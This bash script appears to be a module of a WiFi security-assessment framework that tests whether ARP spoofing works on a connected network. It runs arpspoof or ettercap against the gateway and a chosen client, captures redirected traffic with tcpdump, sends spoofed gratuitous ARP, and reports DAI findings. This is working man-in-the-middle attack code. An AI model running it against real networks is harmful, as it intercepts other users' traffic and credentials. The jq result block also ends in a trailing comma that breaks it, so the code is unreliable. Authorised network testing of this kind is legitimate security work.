#!/usr/bin/env bash
# MODULE_META
# NAME="ARP Spoofing / MITM Test"
# CATEGORY="G"
# DEPS="B1"
# CRITICAL="yes"
# TOOLS="arpspoof,ip,tcpdump"
# DESC="Attempt to ARP-spoof the gateway to intercept traffic"
# REQS="managed_iface,gateway_ip"
# PCAP="yes"
# DECODE="mitm_arp_tls"

set -uo pipefail

#===============================================================================
#  modules/g1_arp_spoofing.sh
#  G1: ARP Spoofing / MITM Test
#
#  PURPOSE:
#    Test if ARP spoofing is possible on the target WiFi network.
#    If successful, this enables Man-in-the-Middle (MITM) attacks:
#    traffic interception, credential capture, session hijacking.
#    Tests for Dynamic ARP Inspection (DAI) effectiveness.
#
#  TOOLS: arpspoof, ettercap, tcpdump
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: B1 (client isolation results)
#
#  EVIDENCE PRODUCED:
#    - g1_arp_spoof_test.txt       (ARP spoof attempt results)
#    - g1_arp_table_before.txt     (ARP table before test)
#    - g1_arp_table_after.txt      (ARP table after test)
#    - g1_mitm_capture.pcap        (traffic captured during MITM)
#
#  RESULT JSON FIELDS:
#    - arp_spoofing_possible: bool
#    - dai_enabled: bool — was the spoof blocked?
#    - traffic_intercepted: bool
#    - mitm_possible: bool
#===============================================================================

run_g1() {
    local total_steps=6
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/g1"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    if ! check_module_dependencies "G1"; then
        return 1
    fi

    local has_arpspoof=true
    local has_ettercap=true

    if [[ -z "${TOOL_PATHS[arpspoof]:-}" ]] || [[ ! -x "${TOOL_PATHS[arpspoof]:-}" ]]; then
        has_arpspoof=false
    fi
    if ! command -v ettercap &>/dev/null; then
        has_ettercap=false
    fi

    if [[ "$has_arpspoof" == "false" && "$has_ettercap" == "false" ]]; then
        log_error "Either arpspoof (dsniff) or ettercap is required."
        return 1
    fi

    # Ensure monitor mode is globally disabled (we need to be connected)
    ensure_managed_mode || return 1

    if [[ -n "${MONITOR_INTERFACE:-}" ]]; then
        disable_monitor_mode
        sleep 3
    fi

    local iface="${WIFI_INTERFACE:-wlan0}"
    local my_ip="${MY_IP%%/*}"
    local gw_ip="${GATEWAY_IP}"

    if [[ -z "$my_ip" || -z "$gw_ip" ]]; then
        log_error "No IP/gateway configured. Connect to target WiFi first."
        return 1
    fi

    log_success "Interface: ${iface}, IP: ${my_ip}, Gateway: ${gw_ip}"

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ ARP SPOOFING / MITM TEST ★                                   ║"
    echo "  ║                                                                    ║"
    echo "  ║  This test will attempt to ARP-spoof the gateway to test if       ║"
    echo "  ║  Dynamic ARP Inspection (DAI) is enabled.                          ║"
    echo "  ║                                                                    ║"
    echo "  ║  If successful, traffic from other clients will be redirected      ║"
    echo "  ║  through our machine (MITM position).                              ║"
    echo "  ║                                                                    ║"
    echo "  ║  This is a DESTRUCTIVE test that may affect other target users.    ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with ARP spoofing test? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    #--- Step 2: Record baseline ARP state ---
    log_step 2 $total_steps "Recording baseline ARP table"
    update_tc_progress 2 $total_steps "Baseline"

    check_abort || return 1

    local arp_before="${evidence_prefix}_arp_table_before.txt"
    {
        echo "=== ARP Table Before Test ==="
        echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo ""
        run_fg --quiet ip neigh show dev "$iface" 2>/dev/null
        echo ""
        echo "=== Gateway ARP entry ==="
        run_fg --quiet ip neigh show "$gw_ip" dev "$iface" 2>/dev/null
    } > "$arp_before"

    local gw_real_mac
    gw_real_mac=$(run_fg --quiet ip neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)
    local my_mac
    my_mac=$(run_fg --quiet ip link show "$iface" 2>/dev/null | awk '/ether/{print $2}')

    log_info "Gateway real MAC: ${gw_real_mac}"
    log_info "Our MAC: ${my_mac}"

    # Select a target client (from B1 or pick the gateway)
    local target_ip="$gw_ip"
    local spoof_target="gateway"

    if has_tc_results "B1"; then
        local b1_data
        b1_data=$(load_tc_result "B1")
        local first_client
        first_client=$(echo "$b1_data" | run_fg jq -r '.reachable_clients[0].ip // ""')
        if [[ -n "$first_client" ]]; then
            echo ""
            echo -e "  ${C_CYAN}Found reachable client from B1: ${first_client}${C_RESET}"
            echo "  [1] ARP spoof between ourselves and gateway (${gw_ip})"
            echo "  [2] ARP spoof between client (${first_client}) and gateway"
            get_or_request_param "target_choice" "  Choose target [1/2]"
            if [[ "$target_choice" == "2" ]]; then
                target_ip="$first_client"
                spoof_target="client"
            fi
        fi
    fi

    #--- Step 3: Enable IP forwarding & start ARP spoof ---
    log_step 3 $total_steps "Attempting ARP spoofing (target: ${spoof_target} ${target_ip})"
    update_tc_progress 3 $total_steps "ARP spoof"

    check_abort || return 1

    # Enable IP forwarding temporarily and register cleanup
    local orig_forwarding
    orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
    register_cleanup "echo ${orig_forwarding} > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true"

    local spoof_file="${evidence_prefix}_arp_spoof_test.txt"
    local capture_file="${evidence_prefix}_mitm_capture.pcap"
    local arp_spoof_possible="false"
    local traffic_intercepted="false"
    local dai_enabled="true"

    {
        echo "============================================================"
        echo "  G1: ARP Spoofing Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target: ${target_ip} (${spoof_target})"
        echo "  Gateway: ${gw_ip}"
        echo "============================================================"
        echo ""
    } > "$spoof_file"

    # Start traffic capture
    spawn_bg "g1_tcpdump" "tcpdump" -i "$iface" -w "$capture_file" "not arp and not host ${my_ip}"

    if [[ "$has_arpspoof" == "true" ]]; then
        # arpspoof from dsniff
        echo "Using arpspoof (dsniff)..." >> "$spoof_file"

        # Spoof in both directions
        spawn_bg "g1_spoof1" "arpspoof" -i "$iface" -t "$target_ip" "$gw_ip"
        spawn_bg "g1_spoof2" "arpspoof" -i "$iface" -t "$gw_ip" "$target_ip"

        # Wait and check
        start_countdown 30 "ARP spoofing active — checking if traffic is redirected"
        sleep 30
        stop_countdown

        # Check if we intercepted any traffic
        local intercepted_packets=0
        intercepted_packets=$(run_fg --quiet tcpdump -r "$capture_file" -c 1 2>/dev/null | wc -l) || true
        intercepted_packets=${intercepted_packets:-0}

        if [[ $intercepted_packets -gt 0 ]]; then
            arp_spoof_possible="true"
            traffic_intercepted="true"
            dai_enabled="false"
            log_result "CRITICAL" "ARP spoofing SUCCEEDED — traffic from ${target_ip} intercepted!"
            echo "RESULT: ARP SPOOFING SUCCEEDED — MITM possible" >> "$spoof_file"
        else
            log_info "No traffic intercepted — ARP spoof may have been blocked (DAI)"
            echo "RESULT: No traffic intercepted — DAI may be active" >> "$spoof_file"
        fi

        # Stop spoofing
        stop_process "g1_spoof1"
        stop_process "g1_spoof2"

    elif [[ "$has_ettercap" == "true" ]]; then
        # Use ettercap
        echo "Using ettercap..." >> "$spoof_file"

        start_countdown 30 "Ettercap ARP MITM active"
        timeout 30 ettercap -T -q -M arp:remote "/${gw_ip}//" "/${target_ip}//" -i "$iface" >> "$spoof_file" 2>&1 || true
        stop_countdown

        # Check capture
        local intercepted_packets=0
        intercepted_packets=$(run_fg --quiet tcpdump -r "$capture_file" -c 1 2>/dev/null | wc -l) || true
        intercepted_packets=${intercepted_packets:-0}

        if [[ $intercepted_packets -gt 0 ]]; then
            arp_spoof_possible="true"
            traffic_intercepted="true"
            dai_enabled="false"
        fi
    fi

    stop_process "g1_tcpdump"
    validate_pcap "$capture_file" "MITM traffic capture during ARP spoof test"

    #--- Step 4: Verify ARP table after attack ---
    log_step 4 $total_steps "Verifying ARP table after attack"
    update_tc_progress 4 $total_steps "ARP verify"

    check_abort || return 1

    local arp_after="${evidence_prefix}_arp_table_after.txt"
    {
        echo "=== ARP Table After Test ==="
        echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo ""
        run_fg --quiet ip neigh show dev "$iface" 2>/dev/null
        echo ""
        echo "=== Gateway ARP entry ==="
        run_fg --quiet ip neigh show "$gw_ip" dev "$iface" 2>/dev/null
    } > "$arp_after"

    # Check if our connectivity was killed (DAI may have blocked us)
    if ! ping -c 1 -W 2 "$gw_ip" &>/dev/null; then
        log_warn "Lost connectivity to gateway — DAI may have blocked our port"
        dai_enabled="true"
        echo "NOTE: Connectivity lost after ARP spoof attempt — DAI likely blocked us" >> "$spoof_file"
    fi

    #--- Step 5: Check for Gratuitous ARP protection ---
    log_step 5 $total_steps "Testing gratuitous ARP acceptance"
    update_tc_progress 5 $total_steps "GARP test"

    check_abort || return 1

    # Send gratuitous ARP claiming to be the gateway
    if [[ -n "${TOOL_PATHS[arping]:-}" ]]; then
        run_fg arping -U -c 3 -I "${iface}" "${gw_ip}" &>/dev/null || true
        sleep 2

        # Check if gateway ARP entry changed
        local gw_current_mac
        gw_current_mac=$(run_fg --quiet ip neigh show "$gw_ip" dev "$iface" 2>/dev/null | awk '{print $5}' | head -1)

        if [[ "$gw_current_mac" == "$my_mac" ]]; then
            arp_spoof_possible="true"
            log_result "FINDING" "Gratuitous ARP accepted — ARP cache was poisoned"
            echo "Gratuitous ARP: ACCEPTED — ARP cache poisoned" >> "$spoof_file"
        else
            log_info "Gratuitous ARP appears filtered or was corrected"
        fi
    fi

    #--- Step 6: Save results ---
    log_step 6 $total_steps "Saving results"
    update_tc_progress 6 $total_steps "Saving"

    local mitm_possible="false"
    [[ "$arp_spoof_possible" == "true" && "$traffic_intercepted" == "true" ]] && mitm_possible="true"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$mitm_possible" == "true" ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: ARP spoofing succeeded and traffic interception confirmed. Man-in-the-Middle attacks are possible on the target WiFi. Dynamic ARP Inspection (DAI) is NOT enabled or not effective."
        recommendations="1) Enable Dynamic ARP Inspection (DAI) on the target VLAN. 2) Enable DHCP Snooping (required for DAI). 3) Configure trusted ports (uplinks) and untrusted ports (client-facing). 4) Enable IP Source Guard on client-facing ports. 5) Consider 802.1X port authentication for additional protection."
    elif [[ "$arp_spoof_possible" == "true" ]]; then
        result_status="FINDING"
        result_summary="ARP cache poisoning was possible but no traffic was intercepted (client isolation may be preventing MITM). DAI may be partially effective."
        recommendations="Enable DAI to prevent ARP cache poisoning entirely. Even with client isolation, ARP spoofing can enable other attacks."
    else
        result_summary="ARP spoofing was blocked. Dynamic ARP Inspection (DAI) appears to be active and effective on the target WiFi."
        recommendations="No action needed. DAI is working correctly."
    fi

    evidence_register_file "$spoof_file"
    evidence_register_file "$arp_before"
    evidence_register_file "$arp_after"
    evidence_register_file "$capture_file"

    local result_json
    result_json=$(run_fg jq -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "ARP spoof: ${arp_spoof_possible}, Traffic intercepted: ${traffic_intercepted}, DAI: ${dai_enabled}" \
        --arg recommendations "$recommendations" \
        --arg arp_spoofing_possible "$arp_spoof_possible" \
        --arg dai_enabled "$dai_enabled" \
        --arg traffic_intercepted "$traffic_intercepted" \
        --arg mitm_possible "$mitm_possible" \
        --arg target_ip "$target_ip" \
        --arg gateway_ip "$gw_ip" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            arp_spoofing_possible: ($arp_spoofing_possible == "true"),
            dai_enabled: ($dai_enabled == "true"),
            traffic_intercepted: ($traffic_intercepted == "true"),
            mitm_possible: ($mitm_possible == "true"),
            target_ip: $target_ip,
            gateway_ip: $gateway_ip,
                    }')

    save_tc_result "G1" "$result_json" 1 1 1 1 1 1 0 1 1 1 0
    save_session_state

    # Display summary
    echo ""
    if [[ "$mitm_possible" == "true" ]]; then
        log_result "CRITICAL" "★ ARP spoofing + MITM CONFIRMED — traffic interception possible"
    elif [[ "$arp_spoof_possible" == "true" ]]; then
        log_result "FINDING" "ARP spoofing possible but traffic not intercepted"
    else
        log_result "SECURE" "ARP spoofing blocked — DAI is active and effective"
    fi

    return 0
}